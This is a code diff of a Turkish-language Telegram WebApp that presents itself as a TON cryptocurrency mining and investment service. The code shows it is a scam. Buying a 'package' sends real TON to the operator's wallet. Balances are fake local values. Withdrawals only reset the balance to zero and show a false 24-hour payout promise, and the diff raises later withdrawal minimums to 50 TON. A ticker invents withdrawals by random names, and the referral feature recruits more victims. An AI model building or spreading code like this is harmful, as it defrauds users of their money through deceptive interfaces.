@@ -36,7 +36,7 @@
 </head>
 <body>
 
-    <div class="live-ticker"><div class="ticker-text" id="ticker">Sistem Aktif...</div></div>
+    <div class="live-ticker"><div class="ticker-text" id="ticker">Sistem Aktif: Çekimler kontrol ediliyor...</div></div>
 
     <div id="p-home" class="page active">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
@@ -47,7 +47,6 @@
         <div class="card" style="border: 1px solid var(--gold); background: rgba(251, 191, 36, 0.1);">
             <div style="font-size: 14px; color: var(--gold); margin-bottom: 10px;">🎁 Günlük Hediye</div>
             <button id="daily-btn" class="btn" style="background: var(--gold); color: #000; padding: 8px;" onclick="getDailyBonus()">Hediyeni Al</button>
-            <div id="bonus-timer" style="font-size: 11px; margin-top: 5px; color: #94a3b8;"></div>
         </div>
 
         <div id="ton-connect-btn" style="display: flex; justify-content: center; margin-bottom: 15px;"></div>
@@ -61,9 +60,9 @@
 
     <div id="p-shop" class="page">
         <h2 style="text-align:center;">🚀 Market</h2>
-        <div class="card"><h3>V1</h3><p>1.9 TON</p><button class="btn" onclick="buySpeed(1.9, 0.5)">Yatırım Yap</button></div>
-        <div class="card"><h3>V2</h3><p>5.0 TON</p><button class="btn" onclick="buySpeed(5.0, 2.5)">Yatırım Yap</button></div>
-        <div class="card"><h3>V3</h3><p>15.0 TON</p><button class="btn" onclick="buySpeed(15.0, 10)">Yatırım Yap</button></div>
+        <div class="card"><h3>V1 Paketi</h3><p>1.9 TON</p><button class="btn" onclick="buySpeed(1.9, 0.5)">Yatırım Yap</button></div>
+        <div class="card"><h3>V2 Paketi</h3><p>5.0 TON</p><button class="btn" onclick="buySpeed(5.0, 2.5)">Yatırım Yap</button></div>
+        <div class="card"><h3>V3 Paketi</h3><p>15.0 TON</p><button class="btn" onclick="buySpeed(15.0, 10)">Yatırım Yap</button></div>
     </div>
 
     <div id="p-leaders" class="page">
@@ -71,13 +70,18 @@
         <div class="card">
             <p>Davet Edilen Arkadaşlar</p>
             <h1 id="ref-count" style="font-size: 48px; color: var(--gold);">0</h1>
+            <p style="font-size: 12px; color: #94a3b8; margin-bottom: 15px;">Arkadaşlarını davet et, kazancını katla!</p>
             <button class="btn" onclick="copyRef()">🔗 Referans Linkini Kopyala</button>
         </div>
     </div>
 
     <div id="p-wallet" class="page">
         <h2 style="text-align:center;">Cüzdan</h2>
-        <div class="card"><p>Bakiyeniz</p><h1 id="wallet-ton">0.0500 💎</h1><button class="btn" onclick="handleWithdraw()">📤 Para Çek</button></div>
+        <div class="card">
+            <p>Toplam Bakiyeniz</p>
+            <h1 id="wallet-ton" style="font-size: 36px; color: var(--blue);">0.0500 💎</h1>
+            <button class="btn" onclick="handleWithdraw()">📤 Para Çek</button>
+        </div>
     </div>
 
     <div class="navbar">
@@ -98,21 +102,38 @@
         let hasInv = localStorage.getItem('hasInv') === 'true';
         let rCount = parseInt(localStorage.getItem('rCount')) || 0;
         let lastBonus = localStorage.getItem('lastBonus') || 0;
+        let wCount = parseInt(localStorage.getItem('wCount')) || 0;
 
-        // GÜNLÜK BONUS FONKSİYONU
+        function copyRef() {
+            const botUsername = "GogircinAdminBot"; // Doğru bot adı
+            const user = Telegram.WebApp.initDataUnsafe.user;
+            if (user && user.id) {
+                const link = "https://t.me/" + botUsername + "?start=" + user.id; // Hatasız link formatı
+                const el = document.createElement('textarea');
+                el.value = link;
+                document.body.appendChild(el);
+                el.select();
+                document.execCommand('copy');
+                document.body.removeChild(el);
+                Telegram.WebApp.showAlert("✅ Referans linki kopyalandı.");
+            } else {
+                Telegram.WebApp.showAlert("❌ Profil bilgileri yüklenemedi. Lütfen uygulamayı kapatıp açın.");
+            }
+        }
+
         function getDailyBonus() {
             const now = Date.now();
             const oneDay = 24 * 60 * 60 * 1000;
             if (now - lastBonus < oneDay) {
-                return Telegram.WebApp.showAlert("Zaten bugünlük ödülünü aldın! Yarın tekrar gel.");
+                return Telegram.WebApp.showAlert("🎁 Bugünlük hediyeni aldın! Yarın tekrar gel.");
             }
-            const prize = (Math.random() * (0.01 - 0.001) + 0.001).toFixed(4); // 0.001 - 0.01 arası rastgele
+            const prize = (Math.random() * (0.01 - 0.001) + 0.001).toFixed(4);
             wBal += parseFloat(prize);
             lastBonus = now;
             localStorage.setItem('wBal', wBal);
             localStorage.setItem('lastBonus', lastBonus);
             update();
-            Telegram.WebApp.showAlert(`🎁 Tebrikler! ${prize} TON günlük bonus kazandın.`);
+            Telegram.WebApp.showAlert(`🎁 Tebrikler! ${prize} TON cüzdanına eklendi.`);
             checkBonusStatus();
         }
 
@@ -129,12 +150,11 @@
             }
         }
 
-        // DİĞER FONKSİYONLAR
-        const names = ["Emre", "Jessica", "Arda", "Selin", "Viktor", "Mert", "Zeynep", "Pavel"];
+        const names = ["Ahmet", "John", "Dmitry", "Fatma", "Alex", "Satoshi", "Elena", "Mehmet"];
         function updateTicker() {
             const name = names[Math.floor(Math.random() * names.length)];
             const amount = (Math.random() * (15 - 1.9) + 1.9).toFixed(2);
-            document.getElementById('ticker').innerText = `🔥 TEBRİKLER: ${name}*** ${amount} TON çekim yaptı! • `;
+            document.getElementById('ticker').innerText = `✅ Son Çekim: ${name}... ${amount} TON çekim yaptı! • `;
         }
         setInterval(updateTicker, 12000); updateTicker();
 
@@ -144,30 +164,6 @@
             document.getElementById('p-'+p).classList.add('active');
             document.getElementById('n-'+p).classList.add('active');
         }
-
-        function copyRef() {
-    const botUsername = "Gogircin_bot"; 
-    const user = Telegram.WebApp.initDataUnsafe.user;
-    
-    if (user && user.id) {
-        // En sorunsuz Telegram WebApp link formatı budur:
-        const link = "https://t.me/" + botUsername + "/app?startapp=" + user.id;
-        
-        const el = document.createElement('textarea');
-        el.value = link;
-        document.body.appendChild(el);
-        el.select();
-        document.execCommand('copy');
-        document.body.removeChild(el);
-        
-        // Sadece kısa ve öz bir onay mesajı:
-        Telegram.WebApp.showAlert("✅ Referans linki kopyalandı.");
-    } else {
-        Telegram.WebApp.showAlert("❌ Hata: Profil yüklenemedi.");
-    }
-}
-
-
 
         function startMining() {
             if(isMining) return;
@@ -180,19 +176,38 @@
             if(mBal <= 0) return;
             wBal += mBal; mBal = 0;
             localStorage.setItem('wBal', wBal); localStorage.setItem('mBal', 0);
-            update(); Telegram.WebApp.showAlert("Kazanç aktarıldı!");
+            update(); Telegram.WebApp.showAlert("⚡ Madencilik kazancı cüzdana aktarıldı!");
         }
 
         function handleWithdraw() {
-            if(!hasInv) return Telegram.WebApp.showAlert("⚠️ Çekim için en az V1 paketi almalısınız.");
-            if(wBal < 1.9) return Telegram.WebApp.showAlert("❌ Yetersiz bakiye (Min 1.9 TON).");
-            Telegram.WebApp.showConfirm("Çekim talebi oluşturulsun mu?", (c) => { if(c) { wBal=0; update(); Telegram.WebApp.showAlert("Talep alındı!"); } });
+            if(!hasInv) return Telegram.WebApp.showAlert("⚠️ Çekim Şartı: En az V1 paketi sahibi olmalısınız.");
+            
+            if(wCount == 0) { // 1. Çekim Şartı
+                if(wBal < 1.9) return Telegram.WebApp.showAlert("❌ 1. Çekim için bakiyeniz en az 1.9 TON olmalıdır.");
+                confirmWithdraw("1.9 TON");
+            } else { // 2. Çekim ve sonrası
+                if(wBal < 50) return Telegram.WebApp.showAlert("❌ Sonraki çekimler için bakiyeniz en az 50 TON olmalıdır.");
+                confirmWithdraw("50 TON");
+            }
+        }
+
+        function confirmWithdraw(amt) {
+            Telegram.WebApp.showConfirm(`${amt} çekim talebi oluşturulsun mu?`, (c) => {
+                if(c) { 
+                    wBal = 0; wCount++; 
+                    localStorage.setItem('wBal', 0); localStorage.setItem('wCount', wCount);
+                    update(); Telegram.WebApp.showAlert("✅ Talebiniz alındı! 24 saat içinde kontrol edilip cüzdanınıza iletilecektir."); 
+                }
+            });
         }
 
         async function buySpeed(amt, boost) {
-            if(!tonConnectUI.connected) return Telegram.WebApp.showAlert("Cüzdan bağla!");
-            try { await tonConnectUI.sendTransaction({ validUntil: Math.floor(Date.now()/1000)+60, messages:[{address: MY_WALLET, amount:(amt*1000000000).toString()}] });
-                pph += boost; hasInv = true; localStorage.setItem('pph', pph); localStorage.setItem('hasInv', 'true'); update();
+            if(!tonConnectUI.connected) return Telegram.WebApp.showAlert("❌ İşlem için önce cüzdanınızı bağlayın!");
+            try { 
+                await tonConnectUI.sendTransaction({ validUntil: Math.floor(Date.now()/1000)+60, messages:[{address: MY_WALLET, amount:(amt*1000000000).toString()}] });
+                pph += boost; hasInv = true; 
+                localStorage.setItem('pph', pph); localStorage.setItem('hasInv', 'true'); 
+                update(); Telegram.WebApp.showAlert("🚀 Yatırım başarılı! Madencilik hızınız arttı.");
             } catch(e) {}
         }
 
